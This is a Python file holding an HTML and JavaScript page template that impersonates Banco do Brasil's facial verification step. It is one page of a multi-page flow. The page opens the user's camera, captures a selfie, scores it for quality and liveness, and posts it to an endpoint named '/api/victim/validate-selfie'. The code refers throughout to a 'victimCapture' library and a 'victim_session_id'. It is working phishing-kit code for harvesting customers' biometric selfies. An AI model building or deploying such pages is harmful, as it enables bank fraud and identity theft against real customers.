"""
Template Enterprise de Selfie com validação Gemini AI
Para substituir no BB_FLUXO_COMPLETO_PAGES[4]["content"]
"""

SELFIE_ENTERPRISE_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Verificação Facial</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 600px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        
        /* Camera Preview */
        .camera-container { position: relative; width: 100%; max-width: 400px; margin: 20px auto; border-radius: 16px; overflow: hidden; }
        #video { width: 100%; display: block; transform: scaleX(-1); /* mirror */ }
        #canvas { display: none; }
        
        /* Face Guide Overlay */
        .face-guide { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 280px; height: 350px; border: 3px solid #FFCC00; border-radius: 50%; pointer-events: none; box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5); }
        .face-guide.valid { border-color: #28a745; }
        .face-guide.invalid { border-color: #dc3545; }
        
        /* Instructions */
        .instructions { background: #e7f3ff; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .instructions h3 { color: #003D7A; margin-bottom: 10px; font-size: 16px; }
        .instructions ul { margin-left: 20px; }
        .instructions li { margin: 5px 0; color: #666; font-size: 14px; }
        
        /* Status Messages */
        .status-message { padding: 12px; border-radius: 6px; margin: 15px 0; font-weight: 600; }
        .status-message.info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .status-message.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .status-message.warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .status-message.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        
        /* Progress Bar */
        .progress-bar { width: 100%; height: 8px; background: #e9ecef; border-radius: 4px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #FFCC00, #003D7A); width: 0%; transition: width 0.3s ease; }
        
        /* Buttons */
        .btn { padding: 14px 40px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px; transition: all 0.3s; }
        .btn:hover:not(:disabled) { background: #002855; transform: translateY(-2px); }
        .btn:disabled { background: #ccc; cursor: not-allowed; opacity: 0.6; }
        .btn-success { background: #28a745; }
        .btn-success:hover:not(:disabled) { background: #218838; }
        
        /* Loading Spinner */
        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Validation Results */
        .validation-results { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: left; display: none; }
        .validation-results.show { display: block; }
        .score-display { font-size: 48px; font-weight: bold; text-align: center; margin: 20px 0; }
        .score-display.high { color: #28a745; }
        .score-display.medium { color: #ffc107; }
        .score-display.low { color: #dc3545; }
        
        .result-item { margin: 10px 0; padding: 10px; background: white; border-radius: 4px; }
        .result-item strong { color: #003D7A; }
        
        /* Recommendations */
        .recommendations { margin-top: 15px; }
        .recommendations li { margin: 8px 0; padding-left: 25px; position: relative; }
        .recommendations li:before { content: "💡"; position: absolute; left: 0; }
        
        /* Hidden State */
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 10px;">📸 Verificação Facial</h2>
        <p style="color: #666; margin-bottom: 20px;">Validação biométrica com Inteligência Artificial</p>
        
        <!-- Instructions -->
        <div class="instructions">
            <h3>📋 Instruções:</h3>
            <ul>
                <li>Posicione seu rosto dentro do guia oval</li>
                <li>Mantenha uma boa iluminação</li>
                <li>Remova óculos escuros</li>
                <li>Mantenha uma expressão natural</li>
                <li>Não use foto de foto ou tela</li>
            </ul>
        </div>
        
        <!-- Status Message -->
        <div id="statusMessage" class="status-message info">
            🎥 Preparando câmera...
        </div>
        
        <!-- Progress Bar -->
        <div class="progress-bar">
            <div id="progressFill" class="progress-fill"></div>
        </div>
        
        <!-- Camera Preview -->
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
            <div id="faceGuide" class="face-guide"></div>
            <canvas id="canvas"></canvas>
        </div>
        
        <!-- Validation Results -->
        <div id="validationResults" class="validation-results">
            <h3 style="color: #003D7A; margin-bottom: 15px;">📊 Resultado da Validação:</h3>
            <div id="scoreDisplay" class="score-display">0%</div>
            <div id="resultDetails"></div>
            <div id="recommendations" class="recommendations hidden"></div>
        </div>
        
        <!-- Buttons -->
        <div id="buttonContainer">
            <button id="captureBtn" class="btn" disabled>
                <span id="captureText">Capturar Foto</span>
                <span id="captureSpinner" class="spinner hidden"></span>
            </button>
            <button id="retryBtn" class="btn hidden">🔄 Tentar Novamente</button>
            <button id="submitBtn" class="btn btn-success hidden">✅ Confirmar e Continuar</button>
        </div>
    </div>
    
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        
        // Elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        const retryBtn = document.getElementById('retryBtn');
        const submitBtn = document.getElementById('submitBtn');
        const statusMessage = document.getElementById('statusMessage');
        const faceGuide = document.getElementById('faceGuide');
        const progressFill = document.getElementById('progressFill');
        const validationResults = document.getElementById('validationResults');
        const scoreDisplay = document.getElementById('scoreDisplay');
        const resultDetails = document.getElementById('resultDetails');
        const recommendations = document.getElementById('recommendations');
        const captureText = document.getElementById('captureText');
        const captureSpinner = document.getElementById('captureSpinner');
        
        // State
        let stream = null;
        let photoData = null;
        let validationData = null;
        let attemptCount = 0;
        const MAX_ATTEMPTS = 3;
        
        // Initialize Camera
        async function initCamera() {
            try {
                updateStatus('info', '🎥 Inicializando câmera...');
                updateProgress(20);
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => resolve();
                });
                
                updateStatus('success', '✅ Câmera pronta! Posicione seu rosto e clique em "Capturar Foto"');
                updateProgress(40);
                captureBtn.disabled = false;
                faceGuide.classList.add('valid');
                
            } catch (err) {
                console.error('Erro ao acessar câmera:', err);
                updateStatus('error', '❌ Erro ao acessar câmera. Verifique as permissões do navegador.');
                captureBtn.disabled = true;
            }
        }
        
        // Capture Photo
        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Mirror the image horizontally
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            
            photoData = canvas.toDataURL('image/jpeg', 0.9);
            
            // Hide video, show canvas
            video.style.display = 'none';
            canvas.style.display = 'block';
            faceGuide.style.display = 'none';
            
            updateProgress(60);
        }
        
        // Validate Selfie with Gemini AI
        async function validateSelfie() {
            try {
                updateStatus('info', '🤖 Validando com Inteligência Artificial...');
                captureBtn.disabled = true;
                captureText.classList.add('hidden');
                captureSpinner.classList.remove('hidden');
                updateProgress(70);
                
                // Call validation endpoint
                const response = await fetch('/api/victim/validate-selfie', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: localStorage.getItem('victim_session_id'),
                        selfie: photoData
                    })
                });
                
                const result = await response.json();
                validationData = result;
                
                updateProgress(90);
                
                // Show results
                showValidationResults(result);
                
                if (result.valid) {
                    updateStatus('success', result.message);
                    faceGuide.classList.add('valid');
                    submitBtn.classList.remove('hidden');
                    updateProgress(100);
                } else {
                    updateStatus('error', result.message);
                    faceGuide.classList.add('invalid');
                    retryBtn.classList.remove('hidden');
                    attemptCount++;
                    
                    if (attemptCount >= MAX_ATTEMPTS) {
                        updateStatus('warning', `⚠️ Você atingiu o limite de ${MAX_ATTEMPTS} tentativas. Entre em contato com o suporte se precisar de ajuda.`);
                        retryBtn.disabled = true;
                    }
                }
                
            } catch (err) {
                console.error('Erro ao validar selfie:', err);
                updateStatus('error', '❌ Erro ao validar selfie. Tente novamente.');
                retryBtn.classList.remove('hidden');
            } finally {
                captureText.classList.remove('hidden');
                captureSpinner.classList.add('hidden');
            }
        }
        
        // Show Validation Results
        function showValidationResults(result) {
            validationResults.classList.add('show');
            
            // Score Display
            const score = Math.round(result.score || 0);
            scoreDisplay.textContent = score + '%';
            
            if (score >= 70) {
                scoreDisplay.className = 'score-display high';
            } else if (score >= 40) {
                scoreDisplay.className = 'score-display medium';
            } else {
                scoreDisplay.className = 'score-display low';
            }
            
            // Details
            const details = result.details || {};
            let detailsHTML = '';
            
            if (details.face_detected !== undefined) {
                detailsHTML += `<div class="result-item"><strong>Rosto Detectado:</strong> ${details.face_detected ? '✅ Sim' : '❌ Não'}</div>`;
            }
            if (details.face_count !== undefined) {
                detailsHTML += `<div class="result-item"><strong>Quantidade de Rostos:</strong> ${details.face_count}</div>`;
            }
            if (details.quality_score !== undefined) {
                detailsHTML += `<div class="result-item"><strong>Qualidade:</strong> ${Math.round(details.quality_score)}%</div>`;
            }
            if (details.liveness_score !== undefined) {
                detailsHTML += `<div class="result-item"><strong>Autenticidade:</strong> ${Math.round(details.liveness_score)}%</div>`;
            }
            
            resultDetails.innerHTML = detailsHTML;
            
            // Recommendations
            if (details.recommendations && details.recommendations.length > 0) {
                let recsHTML = '<h4 style="color: #003D7A; margin-top: 20px;">💡 Recomendações:</h4><ul>';
                details.recommendations.forEach(rec => {
                    recsHTML += `<li>${rec}</li>`;
                });
                recsHTML += '</ul>';
                recommendations.innerHTML = recsHTML;
                recommendations.classList.remove('hidden');
            }
        }
        
        // Update Status Message
        function updateStatus(type, message) {
            statusMessage.className = `status-message ${type}`;
            statusMessage.textContent = message;
        }
        
        // Update Progress Bar
        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }
        
        // Retry Capture
        function retry() {
            // Reset state
            photoData = null;
            validationData = null;
            
            // Show video again
            video.style.display = 'block';
            canvas.style.display = 'none';
            faceGuide.style.display = 'block';
            faceGuide.className = 'face-guide valid';
            
            // Hide buttons and results
            retryBtn.classList.add('hidden');
            submitBtn.classList.add('hidden');
            validationResults.classList.remove('show');
            
            // Enable capture
            captureBtn.disabled = false;
            captureBtn.classList.remove('hidden');
            
            updateStatus('info', '📸 Pronto para nova captura. Posicione seu rosto e tente novamente.');
            updateProgress(40);
        }
        
        // Submit Validated Selfie
        async function submit() {
            if (validationData && validationData.valid) {
                updateStatus('info', '💾 Salvando...');
                // Data already saved by validate endpoint, just navigate
                await captureLib.goToNextPage();
            }
        }
        
        // Event Listeners
        captureBtn.addEventListener('click', async function() {
            capturePhoto();
            await validateSelfie();
        });
        
        retryBtn.addEventListener('click', retry);
        submitBtn.addEventListener('click', submit);
        
        // Initialize on page load
        window.addEventListener('load', initCamera);
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
"""
